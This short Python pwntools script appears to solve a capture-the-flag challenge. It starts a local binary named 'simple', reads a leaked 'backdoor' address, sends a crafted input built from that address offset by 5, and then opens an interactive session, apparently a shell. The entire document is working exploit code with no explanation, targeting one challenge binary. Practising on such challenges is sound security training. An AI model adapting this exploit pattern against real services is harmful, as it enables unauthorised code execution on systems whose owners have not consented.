from pwn import *

r = process('./simple')
r.recvuntil('@ ')
backdoor = int(r.recvline().strip())
r.sendline('- - - '+str(backdoor+5))
r.interactive()
